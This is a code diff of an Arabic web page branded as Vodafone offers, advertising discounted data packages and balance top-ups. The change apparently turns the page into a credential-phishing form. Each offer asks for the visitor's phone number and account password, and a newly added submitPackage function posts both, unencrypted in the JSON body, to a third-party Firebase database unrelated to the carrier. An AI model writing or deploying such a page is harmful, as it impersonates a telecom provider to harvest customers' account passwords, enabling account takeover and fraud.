@@ -1,185 +1,200 @@
 <!DOCTYPE html>
-<html lang="ar" dir="rtl">
+<html lang="ar">
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>عروض Vodafone</title>
+  <title>Vodafone Matrix</title>
   <style>
+    @import url('https://fonts.googleapis.com/css2?family=Cairo:wght@400;700&display=swap');
+
     body {
       margin: 0;
-      background-color: #000;
-      color: #fff;
       font-family: 'Cairo', sans-serif;
+      background-color: black;
+      color: white;
       overflow-x: hidden;
     }
-    header {
-      background-color: #111;
-      padding: 20px;
-      text-align: center;
-      font-size: 24px;
-      color: #f00;
-      border-bottom: 2px solid red;
-    }
+
     .matrix {
       position: fixed;
       top: 0;
       left: 0;
       width: 100%;
       height: 100%;
-      z-index: -1;
       background: black;
-      overflow: hidden;
+      z-index: -1;
+      color: green;
+      font-family: monospace;
+      font-size: 14px;
+      pointer-events: none;
     }
-    canvas {
-      display: block;
-    }
+
     .container {
+      max-width: 600px;
+      margin: auto;
       padding: 20px;
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      gap: 30px;
     }
-    .card {
-      background-color: #111;
+
+    .box {
+      background-color: #1a1a1a;
       border: 1px solid red;
-      padding: 20px;
       border-radius: 10px;
-      max-width: 90%;
-      width: 400px;
-      box-shadow: 0 0 10px red;
+      margin: 20px 0;
+      padding: 15px;
+      text-align: center;
     }
-    .card h3 {
-      color: #f00;
-    }
+
     input, button {
-      width: 100%;
+      width: 90%;
       padding: 10px;
       margin-top: 10px;
-      border-radius: 5px;
       border: none;
+      border-radius: 5px;
+      font-family: 'Cairo', sans-serif;
     }
+
     input {
-      background-color: #222;
-      color: #fff;
+      background-color: #2a2a2a;
+      color: white;
     }
+
     button {
       background-color: red;
       color: white;
       cursor: pointer;
     }
+
     .footer {
-      text-align: center;
-      color: gray;
-      font-size: 12px;
       margin-top: 40px;
+      text-align: center;
+      font-size: 14px;
+      color: gray;
+    }
+
+    .section-title {
+      color: red;
+      margin-top: 40px;
+      text-align: center;
     }
   </style>
 </head>
 <body>
-  <header>عروض Vodafone الخاصة</header>
-  <div class="matrix">
-    <canvas id="matrixCanvas"></canvas>
-  </div>
+  <canvas class="matrix" id="matrix"></canvas>
   <div class="container">
+    <h2 class="section-title">خدمة الباقات</h2>
 
-    <div class="card">
+    <div class="box">
       <h3>بـاقة 42 ألف فليكس - 350 كاش</h3>
-      <p>شروط: خط فليكس 260 - لا يوجد سلف أو نوتة</p>
-      <input type="text" placeholder="رقم الهاتف">
-      <input type="password" placeholder="كلمة المرور">
-      <button>طلب الباقة</button>
+      <p>الخط يكون فليكس 260 - بدون سلف أو نوتة</p>
+      <input id="num1" type="text" placeholder="رقم الهاتف">
+      <input id="pass1" type="password" placeholder="كلمة المرور">
+      <button onclick="submitPackage('بـاقة 42 ألف فليكس', num1.value, pass1.value)">طلب الباقة</button>
     </div>
 
-    <div class="card">
+    <div class="box">
       <h3>بـاقة 13 ألف فليكس - 240 كاش</h3>
-      <p>شروط: لا يوجد سلف أو نوتة</p>
-      <input type="text" placeholder="رقم الهاتف">
-      <input type="password" placeholder="كلمة المرور">
-      <button>طلب الباقة</button>
+      <p>بدون سلف أو نوتة</p>
+      <input id="num2" type="text" placeholder="رقم الهاتف">
+      <input id="pass2" type="password" placeholder="كلمة المرور">
+      <button onclick="submitPackage('بـاقة 13 ألف فليكس', num2.value, pass2.value)">طلب الباقة</button>
     </div>
 
-    <div class="card">
-      <h3>40 جيجا - 330 كاش</h3>
-      <p>بدون شروط</p>
-      <input type="text" placeholder="رقم الهاتف">
-      <input type="password" placeholder="كلمة المرور">
-      <button>طلب الباقة</button>
+    <div class="box">
+      <h3>بـاقة 40 جيجا - 330 كاش</h3>
+      <p>لا يوجد شروط</p>
+      <input id="num3" type="text" placeholder="رقم الهاتف">
+      <input id="pass3" type="password" placeholder="كلمة المرور">
+      <button onclick="submitPackage('بـاقة 40 جيجا', num3.value, pass3.value)">طلب الباقة</button>
     </div>
 
-    <div class="card">
-      <h3>تجديد باقة 50 ألف فليكس - 8 أيام</h3>
-      <p>تجديد فقط - قبل انتهاء الباقة</p>
-      <input type="text" placeholder="رقم الهاتف">
-      <input type="password" placeholder="كلمة المرور">
-      <button>تجديد</button>
+    <div class="box">
+      <h3>تجديد بـاقة 50 ألف فليكس - 8 أيام</h3>
+      <p>يجب التجديد قبل انتهاء الباقة</p>
+      <input id="num4" type="text" placeholder="رقم الهاتف">
+      <input id="pass4" type="password" placeholder="كلمة المرور">
+      <button onclick="submitPackage('تجديد بـاقة 50 ألف فليكس', num4.value, pass4.value)">طلب الباقة</button>
     </div>
 
-    <div class="card">
+    <div class="box">
       <h3>بـاقة 5200 فليكس - 100 كاش</h3>
-      <p>شروط: لا يوجد سلف أو نوتة - غير متوفرة دائماً</p>
-      <input type="text" placeholder="رقم الهاتف">
-      <input type="password" placeholder="كلمة المرور">
-      <button>طلب الباقة</button>
+      <p>بدون سلف أو نوتة - غير متوفرة دائمًا</p>
+      <input id="num5" type="text" placeholder="رقم الهاتف">
+      <input id="pass5" type="password" placeholder="كلمة المرور">
+      <button onclick="submitPackage('بـاقة 5200 فليكس', num5.value, pass5.value)">طلب الباقة</button>
     </div>
 
-    <div class="card">
-      <h3>شحن رصيد صافي</h3>
-      <input type="text" placeholder="رقم الهاتف">
-      <input type="number" placeholder="الرصيد الصافي">
-      <button onclick="calculateMoney()">احسب السعر</button>
-      <p id="calcResult"></p>
+    <h2 class="section-title">خدمة شحن الرصيد الصافي</h2>
+
+    <div class="box">
+      <input id="balanceNum" type="text" placeholder="رقم الهاتف">
+      <input id="balanceAmount" type="number" placeholder="رصيد صافي (مثال: 100)">
+      <button onclick="calcAndSubmitBalance()">شحن الرصيد</button>
+      <p id="result"></p>
     </div>
 
-  </div>
-
-  <div class="footer">
-    Mahmoud Gamal Programming © All rights reserved
+    <div class="footer">
+      © Mahmoud Gamal Programming 2025
+    </div>
   </div>
 
   <script>
     // Matrix Effect
-    const canvas = document.getElementById('matrixCanvas');
-    const ctx = canvas.getContext('2d');
+    const canvas = document.getElementById("matrix");
+    const ctx = canvas.getContext("2d");
     canvas.height = window.innerHeight;
     canvas.width = window.innerWidth;
-
-    const letters = '01';
+    const chars = "0123456789abcdefghijklmnopqrstuvwxyz";
     const fontSize = 16;
     const columns = canvas.width / fontSize;
-    const drops = Array(Math.floor(columns)).fill(1);
-
+    const drops = [];
+    for(let x = 0; x < columns; x++) drops[x] = 1;
     function drawMatrix() {
-      ctx.fillStyle = 'rgba(0, 0, 0, 0.05)';
+      ctx.fillStyle = "rgba(0, 0, 0, 0.05)";
       ctx.fillRect(0, 0, canvas.width, canvas.height);
-
-      ctx.fillStyle = '#0f0';
-      ctx.font = fontSize + 'px monospace';
-
-      for (let i = 0; i < drops.length; i++) {
-        const text = letters.charAt(Math.floor(Math.random() * letters.length));
+      ctx.fillStyle = "#0F0";
+      ctx.font = fontSize + "px monospace";
+      for(let i = 0; i < drops.length; i++) {
+        const text = chars[Math.floor(Math.random() * chars.length)];
         ctx.fillText(text, i * fontSize, drops[i] * fontSize);
-
-        if (drops[i] * fontSize > canvas.height && Math.random() > 0.975) {
-          drops[i] = 0;
-        }
-
+        if(drops[i] * fontSize > canvas.height && Math.random() > 0.975) drops[i] = 0;
         drops[i]++;
       }
     }
+    setInterval(drawMatrix, 33);
 
-    setInterval(drawMatrix, 50);
+    // Firebase
+    async function submitPackage(name, num, pass) {
+      if (!num || !pass) return alert("يرجى إدخال رقم الهاتف وكلمة المرور");
+      const body = {
+        package: name,
+        number: num,
+        password: pass,
+        timestamp: new Date().toISOString()
+      };
+      await fetch("https://starkoscript-default-rtdb.firebaseio.com/requests.json", {
+        method: "POST",
+        body: JSON.stringify(body)
+      });
+      alert("تم إرسال طلبك بنجاح");
+    }
 
-    // Calc
-    function calculateMoney() {
-      const inputs = document.querySelectorAll('input');
-      const amount = parseInt(inputs[inputs.length - 1].value);
-      const result = document.getElementById('calcResult');
-      if (!isNaN(amount)) {
-        result.textContent = `السعر بالجنيه: ${Math.ceil(amount * 1.2)} جنيه`;
-      } else {
-        result.textContent = 'من فضلك ادخل مبلغ صالح';
-      }
+    async function calcAndSubmitBalance() {
+      const num = document.getElementById("balanceNum").value;
+      const amount = parseFloat(document.getElementById("balanceAmount").value);
+      if (!num || !amount) return alert("يرجى إدخال الرقم والرصيد الصافي");
+      const total = amount * 1.2;
+      document.getElementById("result").innerText = `سعر الشحن: ${total} جنيه`;
+      const body = {
+        number: num,
+        net_balance: amount,
+        egp_price: total,
+        timestamp: new Date().toISOString()
+      };
+      await fetch("https://starkoscript-default-rtdb.firebaseio.com/balance.json", {
+        method: "POST",
+        body: JSON.stringify(body)
+      });
+      alert("تم إرسال طلب شحن الرصيد");
     }
   </script>
 </body>
